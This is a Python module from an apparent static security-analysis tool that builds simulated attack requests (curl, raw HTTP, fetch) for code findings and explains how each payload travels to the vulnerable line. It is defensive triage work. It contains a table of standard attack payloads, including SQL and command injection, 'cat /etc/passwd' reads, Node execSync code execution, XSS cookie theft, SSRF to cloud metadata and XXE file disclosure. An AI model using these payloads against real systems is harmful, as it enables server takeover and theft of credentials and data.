"""Attack simulator.

For a finding that user input can reach, build the exact HTTP request an attacker
would send (curl + raw HTTP) and a step-by-step "paper simulation" of how the
payload travels from the route to the dangerous line, ending with the value the
server would actually execute (e.g. the final SQL query).

Nothing is ever sent or executed: this is pure static reasoning over what the
analysis engine already proved (route, input field, taint path, sink template).
"""
from __future__ import annotations

import json
import re
from typing import Any, Dict, List, Optional
from urllib.parse import quote

MARK = "{{INPUT}}"

# category -> (payload, what it does, impact)
PAYLOADS: Dict[str, Dict[str, str]] = {
    "sqli": {
        "payload": "' OR '1'='1' -- ",
        "goal": "Break out of the SQL string and make the WHERE clause always true",
        "impact": "Reads every row of the table (data leak), can bypass login, and with stacked queries can modify or delete data.",
    },
    "nosqli": {
        "payload": '{"$ne": null}',
        "goal": "Replace a plain value with a MongoDB operator that matches everything",
        "impact": "Bypasses login checks and leaks documents that should not be visible.",
    },
    "cmdi": {
        "payload": "; cat /etc/passwd",
        "goal": "End the intended command and start a second one",
        "impact": "Runs any operating-system command on the server: full server takeover.",
    },
    "code": {
        "payload": "require('child_process').execSync('id').toString()",
        "goal": "Make the server evaluate attacker-written JavaScript",
        "impact": "Executes arbitrary code inside the Node.js process: full server takeover.",
    },
    "path": {
        "payload": "../../../../etc/passwd",
        "goal": "Climb out of the intended folder with ../ sequences",
        "impact": "Reads (or writes) any file the server can access: config files, keys, source code.",
    },
    "xss": {
        "payload": "<script>alert(document.cookie)</script>",
        "goal": "Inject HTML/JavaScript into the page another user sees",
        "impact": "Runs script in the victim's browser: session theft, fake login forms, actions as the victim.",
    },
    "ssrf": {
        "payload": "http://169.254.169.254/latest/meta-data/",
        "goal": "Make the server fetch an internal address the attacker cannot reach directly",
        "impact": "Reaches internal services and cloud metadata (credentials) from inside the network.",
    },
    "redirect": {
        "payload": "https://evil.example.com/login",
        "goal": "Send the user from a trusted link to an attacker's site",
        "impact": "Phishing: the victim trusts the link because it starts with your domain.",
    },
    "proto": {
        "payload": '{"__proto__": {"isAdmin": true}}',
        "goal": "Write to Object.prototype through a crafted key",
        "impact": "Every object in the app suddenly has isAdmin = true: privilege escalation or crashes.",
    },
    "deser": {
        "payload": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()\"}",
        "goal": "Smuggle a function into data that is deserialized",
        "impact": "The function runs while the data is being parsed: remote code execution.",
    },
    "xxe": {
        "payload": '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
        "goal": "Declare an XML entity that points to a local file",
        "impact": "The parser inlines server files into the response: file disclosure, SSRF.",
    },
    "redos": {
        "payload": "a" * 40 + "!",
        "goal": "Send input that makes the regular expression backtrack for a very long time",
        "impact": "One request freezes the Node.js event loop: denial of service for all users.",
    },
}

NOT_INPUT_DRIVEN = {"crypto", "secrets", "tls", "ai", "dependency"}

BODY_SOURCES = {"body", "rawBody", "files", "file"}


def _category(f: Dict[str, Any]) -> Optional[str]:
    cat = (f.get("category") or "").lower()
    if cat in PAYLOADS:
        return cat
    cwe = f.get("cwe") or ""
    return {
        "CWE-89": "sqli", "CWE-943": "nosqli", "CWE-78": "cmdi", "CWE-94": "code", "CWE-22": "path", "CWE-79": "xss",
        "CWE-918": "ssrf", "CWE-601": "redirect", "CWE-1321": "proto", "CWE-502": "deser", "CWE-611": "xxe", "CWE-1333": "redos",
    }.get(cwe)


def _payload_for(cat: str, template: Optional[str]) -> str:
    p = PAYLOADS[cat]["payload"]
    before = template.split(MARK, 1)[0] if template else ""
    inside_quotes = (before.count("'") % 2 == 1) or (before.count('"') % 2 == 1)
    if cat == "sqli" and template:
        if not inside_quotes:
            return "1 OR 1=1"  # numeric context: WHERE id = {{INPUT}}
        if template.count(MARK) > 1 and re.search(r"password|passwd|pwd|hash", template, re.I):
            return "admin' -- "  # login query: comment out the password check
    if cat == "cmdi" and template and before.count("'") % 2 == 1:
        return "'; cat /etc/passwd; echo '"
    return p


FALLBACK_EFFECT = {
    "proto": "Object.prototype.isAdmin = true  →  ({}).isAdmin === true for every object in the app",
    "redirect": "HTTP/1.1 302 Found\nLocation: https://evil.example.com/login",
    "nosqli": "db.users.find({ username: { $ne: null } })  →  matches every user",
    "redos": "regex engine backtracks ~2^40 steps  →  event loop blocked",
}


def _render_effect(template: Optional[str], payload: str, cat: str = "") -> Optional[str]:
    if not template or MARK not in template:
        return FALLBACK_EFFECT.get(cat)
    if cat == "redirect":
        return f"HTTP/1.1 302 Found\nLocation: {template.replace(MARK, payload, 1).replace(MARK, 'x')}"
    first, rest = template.split(MARK, 1)
    return first + payload + rest.replace(MARK, "x")


def _shell_quote(s: str) -> str:
    """Single quotes when possible; double quotes (escaped) when the value itself contains a single quote."""
    if "'" not in s:
        return "'" + s + "'"
    if "!" not in s:
        return '"' + re.sub(r'([\\"$`])', r"\\\1", s) + '"'
    return "'" + s.replace("'", "'\"'\"'") + "'"


def _pick_source(sources: List[str], template: Optional[str]) -> Optional[str]:
    if not sources:
        return None
    detailed = [s for s in sources if "." in s]
    return (detailed or sources)[0]


def _structured_value(cat: str, payload: str) -> Any:
    """For JSON bodies some payloads are objects, not strings."""
    if cat in ("nosqli", "proto"):
        try:
            return json.loads(payload)
        except ValueError:
            return payload
    return payload


def build_request(f: Dict[str, Any], port: int, cat: str, payload: str) -> Dict[str, Any]:
    entry = f.get("entry_point") or {}
    method = (entry.get("method") or "").upper()
    path = entry.get("path") or ""
    exact = bool(path and path.startswith("/"))
    if not exact:
        path = "/"
    source = _pick_source(f.get("sources") or [], f.get("template"))
    where, field = ("query", "input")
    guessed_field = True
    if source:
        head, _, tail = source.partition(".")
        if head in ("query", "queryStringParameters", "param", "search", "querystring"):
            where, field, guessed_field = "query", tail or "q", not tail
        elif head in BODY_SOURCES:
            where, field, guessed_field = "body", tail or None, False
        elif head in ("params", "pathParameters"):
            where, field, guessed_field = "path", tail or "id", not tail
        elif head == "headers":
            where, field, guessed_field = "header", tail or "x-input", not tail
        elif head in ("cookies", "signedCookies", "cookie"):
            where, field, guessed_field = "cookie", tail or "session", not tail
        elif head in ("url", "originalUrl", "path"):
            where, field, guessed_field = "url", None, False
    if method in ("", "USE", "ALL", "ROUTE"):
        method = "POST" if where == "body" else "GET"
    if where == "body" and method == "GET":
        method = "POST"

    # fill path parameters (:id) — the targeted one gets the payload
    def fill(m: re.Match) -> str:
        name = m.group(1)
        if where == "path" and name == field:
            return quote(payload, safe="")
        return "1"

    url_path = re.sub(r":([A-Za-z_][A-Za-z0-9_]*)\??", fill, path)
    if where == "path" and f":{field}" not in path:
        url_path = url_path.rstrip("/") + "/" + quote(payload, safe="")
    if where == "url":
        url_path = url_path.rstrip("/") + "/" + quote(payload, safe="/")
    base = f"http://localhost:{port}"
    headers: Dict[str, str] = {}
    body: Optional[str] = None
    query = ""
    if where == "query":
        query = f"?{field}={quote(payload, safe='')}"
        if cat == "nosqli":
            query = f"?{field}[$ne]=x"
    elif where == "body":
        value = _structured_value(cat, payload)
        if field:
            body_obj: Any = {field: value}
        else:
            body_obj = value if isinstance(value, dict) else {"data": value}
        body = json.dumps(body_obj)
        headers["Content-Type"] = "application/json"
    elif where == "header":
        headers[field] = payload
    elif where == "cookie":
        headers["Cookie"] = f"{field}={quote(payload, safe='')}"
    url = base + url_path + query

    parts = ["curl", "-i"]
    if method != "GET":
        parts += ["-X", method]
    for k, v in headers.items():
        parts += ["-H", _shell_quote(f"{k}: {v}")]
    if body is not None:
        parts += ["--data", _shell_quote(body)]
    parts.append(_shell_quote(url))
    curl = " ".join(parts)
    fetch_opts = {"method": method}
    if headers:
        fetch_opts["headers"] = headers
    if body is not None:
        fetch_opts["body"] = body
    fetch_js = f"await fetch({json.dumps(url)}, {json.dumps(fetch_opts)}).then(r => r.text())"
    raw = [f"{method} {url_path}{query} HTTP/1.1", f"Host: localhost:{port}"]
    raw += [f"{k}: {v}" for k, v in headers.items()]
    if body is not None:
        raw += [f"Content-Length: {len(body.encode())}", "", body]
    return {
        "method": method, "url": url, "path": url_path, "headers": headers, "body": body,
        "input_location": where, "input_field": field, "input_label": source,
        "curl": curl, "raw_http": "\n".join(raw), "fetch": fetch_js,
        "route_known": exact, "field_known": not guessed_field,
    }


def simulate(f: Dict[str, Any], nodes_by_id: Dict[str, Dict[str, Any]], port: int) -> Optional[Dict[str, Any]]:
    """Return the attack simulation for one finding, or None if no input drives it."""
    if f.get("taint") != "user_input" or (f.get("category") or "") in NOT_INPUT_DRIVEN:
        return None
    cat = _category(f)
    if not cat:
        return None
    template = f.get("template")
    payload = _payload_for(cat, template)
    req = build_request(f, port, cat, payload)
    reach = f.get("reachability_status")
    entry = f.get("entry_point") or {}

    def label(nid: str) -> Dict[str, Any]:
        n = nodes_by_id.get(nid) or {}
        file_path, _, name = nid.partition("::")
        return {"id": nid, "name": n.get("name") or name or nid, "file_path": n.get("file_path") or file_path, "line": n.get("start_line")}

    steps: List[Dict[str, Any]] = []
    where_txt = {
        "query": f"the URL query parameter '{req['input_field']}'",
        "body": f"the JSON body field '{req['input_field']}'" if req["input_field"] else "the JSON request body",
        "path": f"the URL path segment ':{req['input_field']}'",
        "header": f"the HTTP header '{req['input_field']}'",
        "cookie": f"the cookie '{req['input_field']}'",
        "url": "the request URL",
    }[req["input_location"]]
    steps.append({
        "kind": "request",
        "title": f"Attacker sends {req['method']} {req['path']}",
        "detail": f"The payload is placed in {where_txt}.",
        "value": payload,
    })
    taint_path = [x for x in (f.get("taint_path") or []) if x]
    hops = {h.get("caller"): h.get("line") for h in (f.get("taint_hops") or [])}
    for i, nid in enumerate(taint_path):
        info = label(nid)
        last = i == len(taint_path) - 1
        if i == 0:
            title = f"Route handler {info['name']} reads the input"
            detail = f"{entry.get('label') or 'The request'} is handled here; it takes `{req['input_label'] or 'the input'}` without validating it."
        elif last:
            title = f"{info['name']} receives the payload"
            detail = "The value arrives as a function argument, still untouched."
        else:
            title = f"Passed on to {info['name']}"
            detail = "The tainted value is forwarded as an argument; no sanitizer on the way."
        if nid in hops and not last:
            detail += f" (call on line {hops[nid]})"
        steps.append({"kind": "hop", "title": title, "detail": detail, **info})
    if not taint_path:
        steps.append({"kind": "hop", "title": f"{f.get('function_name') or 'Handler'} reads the input", "detail": "", **label(f.get("function_id") or "")})

    effect = _render_effect(template, payload, cat)
    sink_name = f.get("sink") or "the dangerous API"
    steps.append({
        "kind": "sink",
        "title": f"Payload reaches {sink_name} on line {f.get('line')}",
        "detail": PAYLOADS[cat]["goal"] + ".",
        "code": f.get("snippet"),
        "file_path": f.get("file_path"),
        "line": f.get("line"),
        "effect": effect,
    })
    steps.append({"kind": "impact", "title": "Result", "detail": PAYLOADS[cat]["impact"]})

    if reach == "reachable" and entry.get("kind") in ("route", "server", "platform"):
        verdict, verdict_text = "exploitable", "An outside attacker can send this request today."
    elif reach == "reachable":
        verdict, verdict_text = "exploitable", "Reachable from the project's public API."
    elif reach == "startup_only":
        verdict, verdict_text = "internal", "Only runs at startup — no HTTP request can trigger it."
    elif entry.get("kind") == "route" and entry.get("active") is False:
        verdict, verdict_text = "blocked", f"The route {entry.get('label')} is defined, but its router is never mounted — the request gets a 404."
    else:
        verdict, verdict_text = "blocked", "No route leads here (dead code) — the request would never reach this line."
    confidence = "high" if req["route_known"] and req["field_known"] and effect else ("medium" if req["route_known"] else "low")
    return {
        "category": cat,
        "payload": payload,
        "goal": PAYLOADS[cat]["goal"],
        "impact": PAYLOADS[cat]["impact"],
        "request": req,
        "steps": steps,
        "effect": effect,
        "template": template,
        "verdict": verdict,
        "verdict_text": verdict_text,
        "confidence": confidence,
        "note": "Simulation only — ReachPrioritizer never sends this request. Test it only against your own local copy.",
    }


__all__ = ["simulate", "build_request", "PAYLOADS"]
